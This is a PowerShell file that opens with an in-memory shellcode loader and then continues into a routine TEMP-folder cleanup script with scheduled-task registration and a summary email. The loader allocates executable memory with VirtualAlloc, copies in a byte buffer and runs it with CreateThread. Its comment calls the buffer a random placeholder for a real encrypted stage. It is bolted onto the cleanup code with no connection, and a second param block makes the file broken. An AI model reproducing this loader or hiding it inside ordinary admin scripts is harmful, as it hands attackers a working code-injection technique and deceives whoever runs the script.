
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class MemoryApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x8d, 0xdc, 0xa4, 0xfe, 0xb8, 0xdb, 0xd4, 0xc9, 0x89, 0xc7, 0x95, 0xb3, 0xef, 0xa5, 0xb9, 0x12,
    0xf4, 0xfd, 0x75, 0xe6, 0x6a, 0x3f, 0x80, 0xc5, 0xdc, 0xef, 0x6d, 0xac, 0x71, 0x81, 0x03, 0x3f,
    0xf8, 0xa2, 0xa9, 0x01, 0xee, 0x63, 0xe6, 0x04, 0xcd, 0x30, 0xac, 0x41, 0x79, 0xa6, 0x2b, 0xbb,
    0x50, 0x31, 0xd2, 0xeb, 0x38, 0x3a, 0xad, 0x99, 0xa2, 0xce, 0x72, 0x30, 0x27, 0x4d, 0x89, 0xb2,
    0xb4, 0x17, 0xee, 0x8a, 0x05, 0x52, 0xc9, 0x05, 0xfa, 0xca, 0x89, 0x8a, 0xfc, 0x51, 0xb6, 0x1c,
    0xac, 0x1a, 0x41, 0x1b, 0xd5, 0x68, 0x8c, 0x80, 0x4b, 0x08, 0x98, 0x2d, 0x67, 0x6d, 0x29, 0x62,
    0xb9, 0x8a, 0xd3, 0xdf, 0x4e, 0xf7, 0xfe, 0xa3, 0x72, 0xdf, 0x88, 0x1e, 0x0d, 0xb7, 0x60, 0x92,
    0x99, 0x3f, 0xf9, 0xd4, 0x8c, 0x49, 0xba, 0xed, 0x7f, 0xf6, 0xd6, 0xe1, 0xa6, 0x76, 0x3f, 0x0e,
    0xf8, 0xcc, 0xb6, 0xed, 0x4e, 0x9b, 0xc3, 0xf7, 0xaf, 0xa3, 0x4d, 0x27, 0x45, 0xb4, 0xcd, 0x4e,
    0xb8, 0x98, 0xac, 0x3d, 0x67, 0xf3, 0x0a, 0x54, 0x87, 0x10, 0x9b, 0x41, 0xef, 0xeb, 0x56, 0x03,
    0x2b, 0xdc, 0xea, 0x20, 0x80, 0xd0, 0x1d, 0x93, 0xa0, 0xaf, 0x09, 0x66, 0xba, 0xd4, 0x02, 0xb4,
    0xdb, 0xec, 0x2e, 0x25, 0x04, 0x97, 0x7b, 0x9b, 0xde, 0x59, 0x45, 0x27, 0x6b, 0xa7, 0xfd, 0x18,
    0xa2, 0x8c, 0x7e, 0x89, 0xdd, 0xff, 0x51, 0x9c, 0x31, 0x46, 0x3a, 0x54, 0xdf, 0xe5, 0xf4, 0x4d,
    0x95, 0x35, 0x68, 0xad, 0x6e, 0x75, 0x3c, 0x9a, 0x8e, 0x02, 0x1b, 0xfe, 0xe2, 0xc8, 0xf9, 0x71,
    0x24, 0xde, 0x98, 0xc8, 0x18, 0xa8, 0xf7, 0x99, 0x1a, 0x11, 0xbb, 0x2f, 0x7c, 0x18, 0xa6, 0x93,
    0xdf, 0x78, 0x7b, 0x97, 0x59, 0xc1, 0x0f, 0xcf, 0x7a, 0xea, 0x11, 0xd3, 0x88, 0x61, 0x8f, 0xf2,
    0xe0, 0x97, 0x06, 0xe3, 0xdd, 0x76, 0xe8, 0x60, 0x67, 0xfb, 0xf6, 0x7d, 0x14, 0x61, 0xe5, 0x58,
    0xa5, 0xe1, 0x3b, 0xdf, 0x34, 0xd9, 0x0b, 0x33, 0x07
)

$Handle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][MemoryApi]::WaitForSingleObject($Thread, 2126)
[void][MemoryApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
<#
.SYNOPSIS
    Removes stale scratch files from the current user TEMP folder.
.DESCRIPTION
    Selects files older than the configured age and larger than the size
    threshold, then deletes them from the TEMP folder only.
    Every candidate is re-checked against the TEMP prefix before removal, so a
    reparse point cannot redirect the sweep to another location.
.PARAMETER TempRoot
    Overrides the default value defined in the parameter block.
.NOTES
    Author: IT Systems
    Last updated: 2024-03-04
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [Alias('ScratchPath')]
    [string]$TempRoot = $env:TEMP,
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$AgeDays = 21,
    [int]$MinSizeMB = 10,
    [string]$LogPath = 'C:\Logs\temp-cleanup-2025-04-11.log',

    [switch]$DryRun
)

if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

function Write-LogEntry {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

& Write-LogEntry -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize

$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At "08:00"
Register-ScheduledTask -TaskName 'Contoso-TempCleanup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$MailTo = "ops@adatum.com"

Send-MailMessage `
    -To $MailTo `
    -From "ops@adatum.com" `
    -Subject "TEMP cleanup summary" `
    -Body 'The scheduled TEMP sweep completed. See the JSON report on the host.' `
    -SmtpServer "smtp.internal.corp" `
    -Port 25 `
    -UseSsl
& Write-LogEntry -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
